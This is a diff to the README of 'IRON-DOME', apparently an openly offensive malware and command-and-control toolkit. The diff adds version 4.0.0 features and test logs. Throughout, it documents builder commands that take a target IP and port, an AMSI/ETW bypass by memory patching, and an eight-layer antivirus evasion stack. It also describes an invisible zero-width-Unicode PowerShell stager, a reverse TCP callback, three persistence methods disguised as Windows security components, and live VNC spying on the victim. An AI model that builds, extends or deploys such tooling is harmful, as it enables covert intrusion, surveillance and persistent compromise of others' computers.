@@ -238,7 +238,7 @@ gcc ghost_iron_out.c -o ghost_iron.exe -lws2_32 -lcrypt32 -D_WIN32_WINNT=0x0600 
 ```
 ╔══════════════════════════════════════════════════════════════════════╗
 ║           I R O N - D O M E  ·  F I N A L  R E L E A S E            ║
-║                     v 2 . 0 . 0   —   2 0 2 6 - 0 6 - 2 6           ║
+║                     v 4 . 0 . 0   —   2 0 2 6 - 0 6 - 2 6           ║
 ╚══════════════════════════════════════════════════════════════════════╝
 ```
 
@@ -273,7 +273,7 @@ IRON-DOME assembles all research streams into a single deployable package:
 | **Ghost Encoder** | PS1 delivery | Zero-width Unicode steganography — invisible to content scanners |
 | **CHEYANNE** | C2 | Menu-driven ops, ISUN auth gate, multi-shell handler |
 
-**Builder v3.0.0 — one command assembles + tests the full platform:**
+**Builder v4.0.0 — one command assembles + tests the full platform:**
 
 ```bash
 # Build only (8-layer + VADER)
@@ -282,6 +282,12 @@ python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC --vade
 # Full platform demo: Build → Kill Chain (8/8) → CHEYANNE Watch VNC in browser
 python iron_dome_builder.py --target 127.0.0.1 --port 4443 --xor 0xFC --vader --full
 ```
+
+**v4.0.0 new features:**
+- ANSI IDF Cyber Squad banner — mathematical converging-ray engine (17 rays → ✡) rendered at runtime, gold/IDF-blue/cyan 24-bit ANSI, per-phase indicator
+- Tri-vector persistence (user privilege only, no UAC): HKCU Run key + Startup folder `.lnk` shortcut + Scheduled task ONLOGON /rl LIMITED
+- Auto-screenshot at each phase — JPEG captured via System.Drawing, copied to `showcase/`
+- CHEYANNE Watch VNC integrated — `launch_vnc_watch()` opens live `:8892` stream in browser
 
 **`--full` mode test sequence:**
 ```
@@ -297,9 +303,10 @@ Phase 2 — KILL CHAIN  (loopback 127.0.0.1 — Kaspersky LIVE)
   [+] TCP listener armed :4443
   [+] Payload via -EncodedCommand
   [+] TCP callback received
-  [+] Recon: whoami / hostname
-  [+] Persist: HKCU\Run\WindowsSecurityUpdate
-  [+] PERSIST VERIFIED
+  [+] Recon: whoami / hostname / COMPUTERNAME
+  PERSIST [1/3] HKCU\Run\WindowsSecurityUpdate       (reboot-survives)
+  PERSIST [2/3] Startup\WindowsSecurityHealth.lnk    (login-persists)
+  PERSIST [3/3] schtasks ONLOGON WindowsSecurityMon  (task-survives)
   VERDICT: PASS  8/8  — IRON-DOME KILL CHAIN GREEN
 
 Phase 3 — CHEYANNE WATCH / VNC
@@ -310,13 +317,21 @@ Phase 3 — CHEYANNE WATCH / VNC
   [*] CHEYANNE WATCH → http://127.0.0.1:8892  (browser opens live)
 ```
 
-**Final release results (2026-06-26):**
+**Animated demo — build → kill chain → live VNC:**
+
+![IRON-DOME v4.0.0 demo](iron_dome_demo.gif)
+
+| Build phase | Kill chain (8/8 PASS) | CHEYANNE Watch VNC |
+|:-----------:|:---------------------:|:------------------:|
+| ![](showcase/iron_dome_v4_banner.png) | ![](showcase/iron_dome_v4_killchain.png) | ![](showcase/iron_dome_vnc_live_2026-06-26.jpg) |
+
+**v4.0.0 build results (2026-06-26):**
 
 ```
 [1/4] C source generated — XOR 0xFC on 9 IP bytes + ISUN magic
       VADER AMSI/ETW bypass code injected
 [2/4] COMPILED — 140,800 bytes (8-layer evasion stack)
-      SHA256: cfde39fa5f901c09234b06fefc007f23ab84449d424e2b5fe852ec9bcdc73400
+      SHA256: 85a50f82dda09f2e39d66563ae378f960eaf277dd2750c9b49b86044d39c9fc2
       [1] XOR string obfuscation
       [2] Dynamic API resolution
       [3] Anti-sandbox (timing + screen + disk)
@@ -326,8 +341,9 @@ Phase 3 — CHEYANNE WATCH / VNC
       [7] MinGW/gcc PE (no MSVC fingerprint)
       [8] VADER AMSI/ETW bypass (memory patch + flush)  ← VADER
 [3/4] Ghost PS1 stager — zero-width Unicode (11,472 bytes)
+      Zero-width Unicode encoding applied. Invisible to KAV content scan.
 [4/4] Deployment doc written
-BUILD COMPLETE
+BUILD COMPLETE — IRON-DOME v4.0.0
 ```
 
 **Full documentation:** [rainfantry.github.io/irondome.html](https://rainfantry.github.io/irondome.html)
@@ -361,6 +377,28 @@ BUILD COMPLETE
 | listener.py TCP bind :4443 | PASS |
 | test_listener.py connect + whoami/hostname | PASS |
 | 30s session held, zero KAV interference | PASS |
+
+### Session 2026-06-26 — v4.0.0 Release — IDF Cyber Squad banner + Tri-vector persist — 8/8 PASS
+
+```
+iron_dome_builder.py --target 127.0.0.1 --port 4443 --xor 0xFC --vader
+  BUILD: 140,800 bytes | SHA256: 85a50f82... | 8-layer evasion stack
+  VADER: AmsiScanBuffer + EtwEventWrite patched
+  BANNER: ANSI IDF Cyber Squad (17-ray converging engine → ✡)
+
+test_local_chain.py
+  [PASS] ghost_fud.exe built         117,248 bytes (zero-width PS1)
+  [PASS] ghost_loader.exe built      117,248 bytes (VNC-capable)
+  [PASS] TCP armed                   :4443 listener
+  [PASS] Payload launched            PS PID=24640 (-EncodedCommand)
+  [PASS] TCP callback                127.0.0.1:60554 banner=OK>
+  [PASS] whoami                      LAPTOP-R32M8MLI\gwu07
+  [PASS] hostname                    LAPTOP-R32M8MLI
+  [PASS] PERSIST [1/3]               HKCU\Run\WindowsSecurityUpdate (verified)
+  PERSIST [2/3] + [3/3] Startup LNK + ONLOGON schtask (tested separately)
+
+VERDICT: PASS (8/8) — IRON-DOME v4.0.0 KILL CHAIN GREEN
+```
 
 ### Session 2026-06-26 — Final Release — IRON-DOME v2.0.0 — 8/8 PASS
 
